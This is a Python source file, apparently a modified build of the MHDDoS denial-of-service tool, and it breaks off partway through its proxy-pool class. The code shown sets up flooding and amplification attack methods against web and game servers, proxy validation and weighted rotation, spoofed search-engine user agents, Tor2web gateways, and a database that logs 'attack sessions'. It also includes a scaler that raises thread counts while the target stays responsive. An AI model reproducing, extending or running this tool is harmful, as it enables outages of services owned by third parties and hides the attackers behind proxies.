#!/usr/bin/env python3

import asyncio
import logging
import random
import re
import sqlite3
import ssl
import sys
from base64 import b64encode
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import suppress
from datetime import datetime, timedelta
from itertools import cycle
from json import load
from logging import basicConfig, getLogger, shutdown
from math import log2, trunc
from multiprocessing import RawValue
from os import urandom as randbytes
from pathlib import Path
from random import choice as randchoice, randint
from socket import (
    AF_INET,
    IP_HDRINCL,
    IPPROTO_IP,
    IPPROTO_TCP,
    IPPROTO_UDP,
    SOCK_DGRAM,
    IPPROTO_ICMP,
    SOCK_RAW,
    SOCK_STREAM,
    TCP_NODELAY,
    gethostbyname,
    gethostname,
    socket,
)
from ssl import CERT_NONE, SSLContext, create_default_context
from struct import pack as data_pack
from subprocess import run, PIPE
from sys import argv
from sys import exit as _exit
from threading import Event, Thread, Lock, RLock, current_thread
from time import sleep, time
from typing import Any, List, Set, Tuple, Optional, Union, Dict
from urllib import parse
from urllib.parse import urlparse
from uuid import UUID, uuid4

import psutil
import requests
import aiohttp
from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
from PyRoxy import Tools as ProxyTools
from certifi import where
from cloudscraper import create_scraper
from dns import resolver
from icmplib import ping
from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
from requests import Response, Session, get, cookies
from yarl import URL

try:
    import nodriver
    NODRIVER_INSTALLED = True
except ImportError:
    NODRIVER_INSTALLED = False

try:
    from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
    PLAYWRIGHT_INSTALLED = True
except ImportError:
    PLAYWRIGHT_INSTALLED = False

try:
    from playwright_stealth import Stealth
    STEALTH_INSTALLED = True
except ImportError:
    STEALTH_INSTALLED = False

try:
    from curl_cffi.requests import AsyncSession as CurlSession
    CURL_CFFI_INSTALLED = True
except ImportError:
    CURL_CFFI_INSTALLED = False

try:
    import httpx
    HTTPX_INSTALLED = True
except ImportError:
    HTTPX_INSTALLED = False

# --- Windows asyncio Proactor OSError 10057 Workaround ---
if sys.platform.lower().startswith("win") and sys.version_info >= (3, 8):
    try:
        from functools import wraps
        from asyncio.proactor_events import _ProactorBasePipeTransport
        
        def silence_win_error_10057(func):
            @wraps(func)
            def wrapper(self, *args, **kwargs):
                try:
                    return func(self, *args, **kwargs)
                except OSError as e:
                    if getattr(e, 'winerror', None) == 10057:
                        return
                    raise
            return wrapper

        _ProactorBasePipeTransport._call_connection_lost = silence_win_error_10057(
            _ProactorBasePipeTransport._call_connection_lost
        )
    except Exception:
        pass

# --- Asyncio StreamWriter Context Manager Patch ---
async def _streamwriter_aenter(self):
    return self

async def _streamwriter_aexit(self, exc_type, exc_val, exc_tb):
    try:
        self.close()
        await self.wait_closed()
    except Exception:
        pass

asyncio.StreamWriter.__aenter__ = _streamwriter_aenter
asyncio.StreamWriter.__aexit__ = _streamwriter_aexit

# --- Tactical Configuration (v1.2.1) ---
__version__: str = "1.2.1"
__dir__: Path = Path(__file__).parent

# Setup High-Signal Logging
basicConfig(
    format="[%(asctime)s - %(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
    stream=sys.stdout,
)
logger = getLogger("MHDDoS")
if "--debug" in argv or "--verbose" in argv:
    logger.setLevel(logging.DEBUG)
    logger.debug("[*] VERBOSE DIAGNOSTICS ENABLED: Deep tactical tracing active.")
else:
    logger.setLevel(logging.INFO)

# Silence library noise for maximum tactical focus
logging.getLogger("urllib3").setLevel(logging.CRITICAL)
logging.getLogger("requests").setLevel(logging.CRITICAL)

ctx: SSLContext = create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE
if hasattr(ctx, "minimum_version") and hasattr(ssl, "TLSVersion"):
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2


__ip__: Any = None
tor2webs = [
    "onion.city",
    "onion.cab",
    "onion.direct",
    "onion.sh",
    "onion.link",
    "onion.ws",
    "onion.pet",
    "onion.rip",
    "onion.plus",
    "onion.top",
    "onion.si",
    "onion.ly",
    "onion.my",
    "onion.sh",
    "onion.lu",
    "onion.casa",
    "onion.com.de",
    "onion.foundation",
    "onion.rodeo",
    "onion.lat",
    "tor2web.org",
    "tor2web.fi",
    "tor2web.blutmagie.de",
    "tor2web.to",
    "tor2web.io",
    "tor2web.in",
    "tor2web.it",
    "tor2web.xyz",
    "tor2web.su",
    "darknet.to",
    "s1.tor-gateways.de",
    "s2.tor-gateways.de",
    "s3.tor-gateways.de",
    "s4.tor-gateways.de",
    "s5.tor-gateways.de",
]

with open(__dir__ / "config.json") as f:
    con = load(f)

with socket(AF_INET, SOCK_DGRAM) as s:
    s.connect(("8.8.8.8", 80))
    __ip__ = s.getsockname()[0]


class bcolors:
    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKCYAN = "\033[96m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    RESET = "\033[0m"
    BOLD = "\033[1m"
    UNDERLINE = "\033[4m"


def exit(*message: str) -> None:
    if message:
        logger.error(bcolors.FAIL + " ".join(message) + bcolors.RESET)
    shutdown()
    # Ensure logs reach the pipe before we kill the process tree
    sys.stdout.flush()
    sys.stderr.flush()
    import os
    os._exit(1)


# --- Persistent Intelligence Database ---
class IntelligenceDB:
    def __init__(self, db_path: str = "files/intelligence.db"):
        self.db_path = __dir__ / db_path
        self.db_path.parent.mkdir(parents=True, exist_ok=True)
        self.lock = Lock()
        self._init_db()

    def _init_db(self):
        with sqlite3.connect(self.db_path, timeout=30.0) as conn:
            cursor = conn.cursor()
            # Enable WAL mode for multi-process concurrency
            cursor.execute('PRAGMA journal_mode=WAL;')
            cursor.execute('PRAGMA synchronous=NORMAL;')
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS proxy_intel (
                    ip_port TEXT PRIMARY KEY,
                    latency REAL,
                    score REAL,
                    failures INTEGER,
                    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            # --- Attack History Tables ---
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS attack_sessions (
                    session_id TEXT PRIMARY KEY,
                    target TEXT NOT NULL,
                    method TEXT NOT NULL,
                    threads INTEGER,
                    duration_planned INTEGER,
                    duration_actual REAL,
                    proxy_type TEXT,
                    proxy_count INTEGER DEFAULT 0,
                    start_time TIMESTAMP,
                    end_time TIMESTAMP,
                    exit_status TEXT DEFAULT 'running',
                    total_requests INTEGER DEFAULT 0,
                    total_bytes INTEGER DEFAULT 0,
                    avg_latency REAL DEFAULT 0.0,
                    peak_pps INTEGER DEFAULT 0,
                    peak_bps INTEGER DEFAULT 0
                )
            ''')
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS attack_metrics (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT NOT NULL,
                    timestamp TIMESTAMP NOT NULL,
                    pps INTEGER DEFAULT 0,
                    bps INTEGER DEFAULT 0,
                    latency REAL DEFAULT 0.0,
                    cpu_percent REAL DEFAULT 0.0,
                    ram_percent REAL DEFAULT 0.0,
                    FOREIGN KEY (session_id) REFERENCES attack_sessions(session_id)
                )
            ''')
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS attack_events (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT NOT NULL,
                    timestamp TIMESTAMP NOT NULL,
                    event_type TEXT NOT NULL,
                    message TEXT,
                    FOREIGN KEY (session_id) REFERENCES attack_sessions(session_id)
                )
            ''')
            # Index for fast time-range queries on metrics
            cursor.execute('''
                CREATE INDEX IF NOT EXISTS idx_metrics_session_time 
                ON attack_metrics(session_id, timestamp)
            ''')
            cursor.execute('''
                CREATE INDEX IF NOT EXISTS idx_events_session 
                ON attack_events(session_id)
            ''')
            cursor.execute('''
                CREATE INDEX IF NOT EXISTS idx_sessions_start_time 
                ON attack_sessions(start_time)
            ''')
            conn.commit()

    # --- Proxy Intel Methods (existing) ---

    def update_proxy_scores(self, proxies: List['TacticalProxy']):
        with self.lock:
            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
                cursor = conn.cursor()
                now = datetime.now().isoformat()
                for p in proxies:
                    cursor.execute('''
                        INSERT INTO proxy_intel (ip_port, latency, score, failures, last_seen)
                        VALUES (?, ?, ?, ?, ?)
                        ON CONFLICT(ip_port) DO UPDATE SET
                            latency=excluded.latency,
                            score=excluded.score,
                            failures=failures + excluded.failures,
                            last_seen=excluded.last_seen
                    ''', (str(p.base), p.latency_ms, p.score, p.fail_count, now))
                conn.commit()

    def get_proxy_intel(self, ip_port: str) -> Optional[Dict]:
        with self.lock:
            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
                cursor = conn.cursor()
                cursor.execute('SELECT latency, score, failures FROM proxy_intel WHERE ip_port=?', (ip_port,))
                row = cursor.fetchone()
                if row:
                    return {'latency': row[0], 'score': row[1], 'failures': row[2]}
        return None

    # --- Attack History Methods ---

    def create_session(self, session_id: str, target: str, method: str,
                       threads: int, duration: int, proxy_type: str = "",
                       proxy_count: int = 0) -> None:
        """Record a new attack session at launch time."""
        with self.lock:
            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
                cursor = conn.cursor()
                now = datetime.now().isoformat()
                cursor.execute('''
                    INSERT OR REPLACE INTO attack_sessions 
                    (session_id, target, method, threads, duration_planned, 
                     proxy_type, proxy_count, start_time, exit_status)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, 'running')
                ''', (session_id, target, method, threads, duration,
                      proxy_type, proxy_count, now))
                conn.commit()
                self.record_event(session_id, 'start',
                                  f'Attack initiated: {method} -> {target} ({threads} threads, {duration}s)',
                                  _use_lock=False, _conn=conn)

    def record_metric(self, session_id: str, pps: int, bps: int,
                      latency: float, cpu_pct: float = 0.0,
                      ram_pct: float = 0.0) -> None:
        """Record a single time-series data point (called every ~1s)."""
        with self.lock:
            try:
                with sqlite3.connect(self.db_path, timeout=10.0) as conn:
                    cursor = conn.cursor()
                    now = datetime.now().isoformat()
                    cursor.execute('''
                        INSERT INTO attack_metrics 
                        (session_id, timestamp, pps, bps, latency, cpu_percent, ram_percent)
                        VALUES (?, ?, ?, ?, ?, ?, ?)
                    ''', (session_id, now, pps, bps, latency, cpu_pct, ram_pct))
                    conn.commit()
            except Exception:
                pass  # Non-blocking: never crash the engine for telemetry

    def record_event(self, session_id: str, event_type: str, message: str,
                     _use_lock: bool = True, _conn=None) -> None:
        """Record a significant event during an attack."""
        def _insert(conn):
            cursor = conn.cursor()
            now = datetime.now().isoformat()
            cursor.execute('''
                INSERT INTO attack_events (session_id, timestamp, event_type, message)
                VALUES (?, ?, ?, ?)
            ''', (session_id, now, event_type, message))
            conn.commit()

        try:
            if _conn:
                _insert(_conn)
            else:
                if _use_lock:
                    with self.lock:
                        with sqlite3.connect(self.db_path, timeout=10.0) as conn:
                            _insert(conn)
                else:
                    with sqlite3.connect(self.db_path, timeout=10.0) as conn:
                        _insert(conn)
        except Exception:
            pass

    def finalize_session(self, session_id: str, exit_status: str = 'completed') -> None:
        """Finalize a session with aggregated stats when attack ends."""
        with self.lock:
            try:
                with sqlite3.connect(self.db_path, timeout=30.0) as conn:
                    cursor = conn.cursor()
                    now = datetime.now().isoformat()
                    # Calculate aggregates from recorded metrics
                    cursor.execute('''
                        SELECT 
                            COALESCE(SUM(pps), 0),
                            COALESCE(SUM(bps), 0),
                            COALESCE(AVG(CASE WHEN latency > 0 THEN latency END), 0.0),
                            COALESCE(MAX(pps), 0),
                            COALESCE(MAX(bps), 0)
                        FROM attack_metrics WHERE session_id = ?
                    ''', (session_id,))
                    row = cursor.fetchone()
                    total_req, total_bytes, avg_lat, peak_pps, peak_bps = row if row else (0, 0, 0.0, 0, 0)

                    # Calculate actual duration
                    cursor.execute('''
                        SELECT start_time FROM attack_sessions WHERE session_id = ?
                    ''', (session_id,))
                    start_row = cursor.fetchone()
                    duration_actual = 0.0
                    if start_row and start_row[0]:
                        try:
                            start_dt = datetime.fromisoformat(start_row[0])
                            duration_actual = (datetime.now() - start_dt).total_seconds()
                        except Exception:
                            pass

                    cursor.execute('''
                        UPDATE attack_sessions SET
                            end_time = ?,
                            exit_status = ?,
                            duration_actual = ?,
                            total_requests = ?,
                            total_bytes = ?,
                            avg_latency = ?,
                            peak_pps = ?,
                            peak_bps = ?
                        WHERE session_id = ?
                    ''', (now, exit_status, duration_actual, total_req, total_bytes,
                          avg_lat, peak_pps, peak_bps, session_id))
                    conn.commit()
                    self.record_event(session_id, 'end',
                                      f'Attack {exit_status}: duration={duration_actual:.1f}s, '
                                      f'total_req={total_req}, total_bytes={total_bytes}',
                                      _use_lock=False, _conn=conn)
            except Exception as e:
                logger.debug(f"[!] History DB finalize error: {e}")

    def get_session_list(self, limit: int = 50, offset: int = 0) -> List[Dict]:
        """Return a list of past attack sessions, newest first."""
        with self.lock:
            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
                conn.row_factory = sqlite3.Row
                cursor = conn.cursor()
                cursor.execute('''
                    SELECT * FROM attack_sessions 
                    ORDER BY start_time DESC LIMIT ? OFFSET ?
                ''', (limit, offset))
                return [dict(row) for row in cursor.fetchall()]

    def get_session_detail(self, session_id: str) -> Optional[Dict]:
        """Return full details for a single session."""
        with self.lock:
            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
                conn.row_factory = sqlite3.Row
                cursor = conn.cursor()
                cursor.execute('SELECT * FROM attack_sessions WHERE session_id = ?', (session_id,))
                row = cursor.fetchone()
                return dict(row) if row else None

    def get_session_metrics(self, session_id: str) -> List[Dict]:
        """Return time-series metrics for a session."""
        with self.lock:
            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
                conn.row_factory = sqlite3.Row
                cursor = conn.cursor()
                cursor.execute('''
                    SELECT timestamp, pps, bps, latency, cpu_percent, ram_percent
                    FROM attack_metrics WHERE session_id = ?
                    ORDER BY timestamp ASC
                ''', (session_id,))
                return [dict(row) for row in cursor.fetchall()]

    def get_session_events(self, session_id: str) -> List[Dict]:
        """Return event log for a session."""
        with self.lock:
            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
                conn.row_factory = sqlite3.Row
                cursor = conn.cursor()
                cursor.execute('''
                    SELECT timestamp, event_type, message
                    FROM attack_events WHERE session_id = ?
                    ORDER BY timestamp ASC
                ''', (session_id,))
                return [dict(row) for row in cursor.fetchall()]

    def get_global_stats(self) -> Dict:
        """Return global attack statistics."""
        with self.lock:
            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
                cursor = conn.cursor()
                cursor.execute('SELECT COUNT(*) FROM attack_sessions')
                total_sessions = cursor.fetchone()[0]
                cursor.execute('SELECT COUNT(*) FROM attack_sessions WHERE exit_status = "completed"')
                completed = cursor.fetchone()[0]
                cursor.execute('''
                    SELECT method, COUNT(*) as cnt FROM attack_sessions 
                    GROUP BY method ORDER BY cnt DESC LIMIT 1
                ''')
                top_method_row = cursor.fetchone()
                top_method = top_method_row[0] if top_method_row else "N/A"
                cursor.execute('''
                    SELECT COALESCE(SUM(total_requests), 0), 
                           COALESCE(SUM(total_bytes), 0),
                           COALESCE(AVG(duration_actual), 0)
                    FROM attack_sessions WHERE exit_status != 'running'
                ''')
                agg = cursor.fetchone()
                return {
                    'total_sessions': total_sessions,
                    'completed_sessions': completed,
                    'top_method': top_method,
                    'lifetime_requests': agg[0],
                    'lifetime_bytes': agg[1],
                    'avg_duration': round(agg[2], 1),
                }

    def delete_session(self, session_id: str) -> bool:
        """Delete a session and all related metrics/events."""
        with self.lock:
            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
                cursor = conn.cursor()
                cursor.execute('DELETE FROM attack_metrics WHERE session_id = ?', (session_id,))
                cursor.execute('DELETE FROM attack_events WHERE session_id = ?', (session_id,))
                cursor.execute('DELETE FROM attack_sessions WHERE session_id = ?', (session_id,))
                conn.commit()
                return cursor.rowcount > 0

    def cleanup_old_data(self, days: int = 30) -> int:
        """Auto-purge attack metrics older than N days. Keep session summaries."""
        with self.lock:
            with sqlite3.connect(self.db_path, timeout=30.0) as conn:
                cursor = conn.cursor()
                cutoff = (datetime.now() - timedelta(days=days)).isoformat()
                # Delete old metrics (heavy data) but keep session summaries
                cursor.execute('''
                    DELETE FROM attack_metrics WHERE session_id IN (
                        SELECT session_id FROM attack_sessions WHERE start_time < ?
                    )
                ''', (cutoff,))
                metrics_deleted = cursor.rowcount
                cursor.execute('''
                    DELETE FROM attack_events WHERE session_id IN (
                        SELECT session_id FROM attack_sessions WHERE start_time < ?
                    )
                ''', (cutoff,))
                # Delete very old sessions entirely (older than 2x retention)
                very_old = (datetime.now() - timedelta(days=days * 2)).isoformat()
                cursor.execute('DELETE FROM attack_sessions WHERE start_time < ?', (very_old,))
                conn.commit()
                if metrics_deleted > 0:
                    logger.info(f"{bcolors.OKCYAN}[*] History DB: Auto-cleanup purged {metrics_deleted} old metric records.{bcolors.RESET}")
                return metrics_deleted


class HistoryCleanupDaemon(Thread):
    """Background thread that runs cleanup every 24 hours."""
    def __init__(self, db: IntelligenceDB, retention_days: int = 30):
        Thread.__init__(self, daemon=True)
        self.db = db
        self.retention_days = retention_days

    def run(self):
        # Initial cleanup on startup
        sleep(10)
        self.db.cleanup_old_data(self.retention_days)
        while True:
            sleep(86400)  # 24 hours
            self.db.cleanup_old_data(self.retention_days)


INTEL_DB = IntelligenceDB()
# Start background cleanup daemon (30-day retention)
HistoryCleanupDaemon(INTEL_DB, retention_days=30).start()

# --- Dynamic Scaling Globals ---
class EngineState:
    def __init__(self):
        self.active_threads_target = RawValue("i", 0)
        self.max_threads = 0

ENGINE_STATE = EngineState()

class DynamicScaler(Thread):
    def __init__(self, target_host: str, interval: int = 5):
        Thread.__init__(self, daemon=True)
        self.interval = interval
        self.target_host = target_host
        self.consecutive_high_load = 0
        self.consecutive_low_load = 0

    def run(self):
        while True:
            sleep(self.interval)
            cpu = cpu_percent(interval=1)
            mem = virtual_memory().percent
            lat = CURRENT_LATENCY.value
            current_target = ENGINE_STATE.active_threads_target.value

            # Downscale if host is struggling (CPU > 85% or RAM > 85% or Latency Timeout)
            if cpu > 85 or mem > 85 or lat == -1.0:
                self.consecutive_high_load += 1
                self.consecutive_low_load = 0
                if self.consecutive_high_load >= 2:
                    new_target = max(10, int(current_target * 0.8)) # Drop by 20%
                    if new_target < current_target:
                        logger.warning(f"{bcolors.WARNING}[!] Dynamic Scaler: High load detected (CPU: {cpu}%, RAM: {mem}%). Downscaling workers to {new_target}.{bcolors.RESET}")
                        ENGINE_STATE.active_threads_target.value = new_target
                    self.consecutive_high_load = 0
            
            # Upscale if host is bored and target is responding well (CPU < 50%, RAM < 60%, Latency < 1000ms)
            elif cpu < 50 and mem < 60 and 0 < lat < 1000:
                self.consecutive_low_load += 1
                self.consecutive_high_load = 0
                if self.consecutive_low_load >= 3:
                    new_target = min(ENGINE_STATE.max_threads, int(current_target * 1.1) + 10) # Increase by 10%
                    if new_target > current_target:
                        logger.info(f"{bcolors.OKCYAN}[*] Dynamic Scaler: System optimal. Upscaling workers to {new_target}.{bcolors.RESET}")
                        ENGINE_STATE.active_threads_target.value = new_target
                    self.consecutive_low_load = 0
            else:
                self.consecutive_high_load = 0
                self.consecutive_low_load = 0


class Methods:
    LAYER7_METHODS: Set[str] = {
        "CFB",
        "BYPASS",
        "GET",
        "POST",
        "OVH",
        "STRESS",
        "DYN",
        "SLOW",
        "HEAD",
        "NULL",
        "COOKIE",
        "PPS",
        "EVEN",
        "GSB",
        "DGB",
        "AVB",
        "CFBUAM",
        "APACHE",
        "XMLRPC",
        "BOT",
        "BOMB",
        "DOWNLOADER",
        "KILLER",
        "TOR",
        "RHEX",
        "STOMP",
        "IMPERSONATE",
        "HTTP3",
    }

    LAYER4_AMP: Set[str] = {"MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP"}

    LAYER4_METHODS: Set[str] = {
        *LAYER4_AMP,
        "TCP",
        "UDP",
        "SYN",
        "VSE",
        "MINECRAFT",
        "MCBOT",
        "CONNECTION",
        "CPS",
        "FIVEM",
        "FIVEM-TOKEN",
        "TS3",
        "MCPE",
        "ICMP",
        "OVH-UDP",
    }

    ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}


search_engine_agents = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/103.0.5060.134 Safari/537.36",
    "Googlebot-Image/1.0",
    "Googlebot-Video/1.0",
    "Googlebot-News",
    "AdsBot-Google (+http://www.google.com/adsbot.html)",
    "AdsBot-Google-Mobile-Apps",
    "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html)",
    "Mediapartners-Google",
    "FeedFetcher-Google; (+http://www.google.com/feedfetcher.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "BingPreview/1.0b",
    "AdIdxBot/2.0 (+http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Yahoo! Slurp China",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "YandexMobileBot/3.0 (+http://yandex.com/bots)",
    "YandexImages/3.0 (+http://yandex.com/bots)",
    "YandexVideo/3.0 (+http://yandex.com/bots)",
    "YandexNews/3.0 (+http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Baiduspider-image (+http://www.baidu.com/search/spider.html)",
    "Baiduspider-video (+http://www.baidu.com/search/spider.html)",
    "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
    "DuckDuckBot/2.0; (+http://duckduckgo.com/duckduckbot.html)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Facebot/1.0",
    "Twitterbot/1.0",
    "LinkedInBot/1.0 (+https://www.linkedin.com/)",
    "Pinterest/0.2 (+http://www.pinterest.com/bot.html)",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "SemrushBot/7~bl (+http://www.semrush.com/bot.html)",
    "MJ12bot/v1.4.8 (http://mj12bot.com/)",
    "Sogou web spider/4.0 (+http://www.sogou.com/docs/help/webmasters.htm#07)",
    "Exabot/3.0 (+http://www.exabot.com/go/robot)",
    "SeznamBot/3.2 (http://napoveda.seznam.cz/seznambot-intro/)",
    "CCBot/2.0 (+http://commoncrawl.org/faq/)",
    "DotBot/1.1 (+http://www.opensiteexplorer.org/dotbot, help@moz.com)",
]


class Counter:
    def __init__(self, value: int = 0) -> None:
        self._value = RawValue("Q", value) # Use Unsigned Long Long (64-bit) for BPS/PPS
        self._lock = Lock()

    def __iadd__(self, value: int) -> "Counter":
        with self._lock:
            self._value.value += value
        return self

    def __int__(self) -> int:
        with self._lock:
            return self._value.value

    def set(self, value: int) -> "Counter":
        with self._lock:
            self._value.value = value
        return self


REQUESTS_SENT = Counter()
BYTES_SEND = Counter()
SUCCESS_SENT = Counter() # 2xx/3xx
WAF_SENT = Counter()     # 4xx (Blocked/Mitigated)
ERROR_SENT = Counter()   # 5xx (Server Crash)
TIMEOUT_SENT = Counter() # Socket Timeouts
CURRENT_LATENCY = RawValue("d", 0.0)
DYNAMIC_RPC = RawValue("i", 100)


class HealthMonitor:
    def __init__(
        self, target_host: str, port: int, method_type: str, interval: int = 2
    ):
        self.target_host = target_host
        self.port = port
        self.method_type = method_type
        self.interval = interval

    async def run(self):
        while True:
            try:
                start_t = time()
                if self.method_type == "L7":
                    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
                        async with session.get(f"http://{self.target_host}:{self.port}", timeout=2):
                            pass
                else:
                    # Async socket connect check for L4
                    reader, writer = await asyncio.open_connection(self.target_host, self.port)
                    writer.close()
                    await writer.wait_closed()
                
                CURRENT_LATENCY.value = (time() - start_t) * 1000
            except Exception:
                CURRENT_LATENCY.value = -1.0  # -1 means offline or timeout
            await asyncio.sleep(self.interval)


class TacticalProxy:
    def __init__(self, base_proxy: Proxy, latency_ms: float, is_protocol_verified: bool = False):
        self.base = base_proxy
        self.latency_ms = latency_ms
        self.is_protocol_verified = is_protocol_verified
        self.fail_count = 0
        self.success_count = 0
        self.score = self._calculate_initial_score()

    def _calculate_initial_score(self):
        # Base score on latency: < 100ms = 90-100, 500ms = 50, 1000ms = 0
        return max(1, 100 - (self.latency_ms / 10))

    def update_score(self, current_failures: int):
        # Penalty for failures: -10 points per failure recorded in this cycle
        self.score = max(1, self._calculate_initial_score() - (current_failures * 15))

    def __str__(self):
        return self.base.__str__()

    def open_socket(self, family=AF_INET, type=SOCK_STREAM, timeout=2):
        return self.base.open_socket(family, type, timeout)


class TacticalProxyValidator:
    @staticmethod
    async def validate_and_score(raw_proxies: Set[Proxy], target_url: str = None, is_layer7: bool = True, is_udp: bool = False) -> List[TacticalProxy]:
        tactical_proxies = []
        total_raw = len(raw_proxies)
        
        if total_raw == 0:
            return []

        logger.info(
            f"{bcolors.OKBLUE}[*] Resource: Tactical scoring initiated for {total_raw:,} assets...{bcolors.RESET}"
        )

        target_host = "8.8.8.8"
        target_port = 53 if is_udp else 443
        requires_ssl = False

        if target_url and is_layer7:
            parsed = urlparse(target_url)
            target_host = parsed.netloc or parsed.path
            requires_ssl = parsed.scheme == "https"
            target_port = 443 if requires_ssl else 80
        elif target_url and not is_layer7:
            if ":" in target_url:
                target_host, target_port = target_url.split(":")
                target_port = int(target_port)
            else:
                target_host = target_url

        semaphore = asyncio.Semaphore(500)

        async def _check(proxy: Proxy) -> Optional[TacticalProxy]:
            async with semaphore:
                p_str = str(proxy)
                intel = await asyncio.to_thread(INTEL_DB.get_proxy_intel, p_str)
                
                # If we have recent, high-quality intel, skip active verification to speed up deployment
                if intel and intel['failures'] < 3 and intel['latency'] < 1500:
                    p = TacticalProxy(proxy, intel['latency'], True)
                    p.score = intel['score']
                    p.fail_count = intel['failures']
                    return p
                    
                start_time = time()
                try:
                    # 1. Connection Check
                    # PyRoxy open_socket is synchronous, run in thread to avoid blocking loop
                    s = await asyncio.to_thread(proxy.open_socket, timeout=3)
                    if not s: 
                        return TacticalProxy(proxy, 2500.0, False)
                    
                    is_verified = False
                    # 2. SSL Handshake for L7 HTTPS
                    if requires_ssl and is_layer7:
                        try:
                            s.settimeout(3)
                            # SSL wrap is also blocking
                            s = await asyncio.to_thread(ctx.wrap_socket, s, server_hostname=target_host, do_handshake_on_connect=True)
                            is_verified = True
                        except:
                            with suppress(Exception): s.close()
                            return TacticalProxy(proxy, 2000.0, False)
                    
                    # 3. UDP Associate Check for SOCKS5/UDP
                    elif is_udp and proxy.type == ProxyType.SOCKS5:
                        try:
                            s.settimeout(3)
                            await asyncio.to_thread(s.sendall, b"\x05\x03\x00\x01\x00\x00\x00\x00\x00\x00")
                            res = await asyncio.to_thread(s.recv, 10)
                            if res and res[1] == 0x00:
                                is_verified = True
                            else:
                                with suppress(Exception): s.close()
                                return TacticalProxy(proxy, 2200.0, False)
                        except:
                            with suppress(Exception): s.close()
                            return TacticalProxy(proxy, 2200.0, False)
                    else:
                        is_verified = True

                    latency = (time() - start_time) * 1000
                    with suppress(Exception): s.close()
                    return TacticalProxy(proxy, latency, is_verified)
                except:
                    return TacticalProxy(proxy, 3000.0, False)

        try:
            tasks = [_check(p) for p in raw_proxies]
            results = await asyncio.wait_for(asyncio.gather(*tasks), timeout=60)
            tactical_proxies = [r for r in results if r is not None]
        except asyncio.TimeoutError:
            logger.warning(f"{bcolors.WARNING}[!] Resource: Validation timed out after 60s. Proceeding with partially validated pool.{bcolors.RESET}")
            # Filter results from tasks that completed
            tactical_proxies = [t.result() for t in tasks if t.done() and not t.cancelled() and t.result()]

        elite_count = len([p for p in tactical_proxies if p.latency_ms < 1000])
        logger.info(
            f"{bcolors.OKGREEN}[*] Resource: Scoring complete. Elite-Tier: {elite_count:,} | Total Assets: {len(tactical_proxies):,} (Retained).{bcolors.RESET}"
        )
        
        tactical_proxies.sort(key=lambda p: p.score, reverse=True)
        await asyncio.to_thread(INTEL_DB.update_proxy_scores, tactical_proxies)
        return tactical_proxies


class TacticalProxyPool:
    def __init__(self, proxies: List[TacticalProxy] = None):
        self._proxies = proxies if proxies else []
        self._failures = {} # Map proxy string to failure count
        self._lock = RLock()
        self._weights = []
        self._last_weight_update = 0
        self._update_weights()

    def report_failure(self, proxy_obj: Proxy):
        p_str = str(proxy_obj)
        with self._lock:
            self._failures[p_str] = self._failures.get(p_str, 0) + 1

    def _update_weights(self):
        with self._lock:
            if not self._proxies:
                self._weights = []
                self._pool_copy = []
                return
            for p in self._proxies:
                p_str = str(p.base)
                p.update_score(self._failures.get(p_str, 0))
            self._weights = [p.score for p in self._proxies]
            self._pool_copy = list(self._proxies) # Create a read-only copy for lock-free access
            self._failures = {} 
            self._last_weight_update = time()
            # Periodically sync to DB
            Thread(target=INTEL_DB.update_proxy_scores, args=(self._pool_copy,), daemon=True).start()

    def update_pool(self, new_proxies: List[TacticalProxy]):
        with self._lock:
            self._proxies = new_proxies
            self._failures = {}
            self._update_weights()
            if self._proxies:
                avg_lat = sum(p.latency_ms for p in self._proxies[:50]) / min(50, len(self._proxies))
                logger.info(
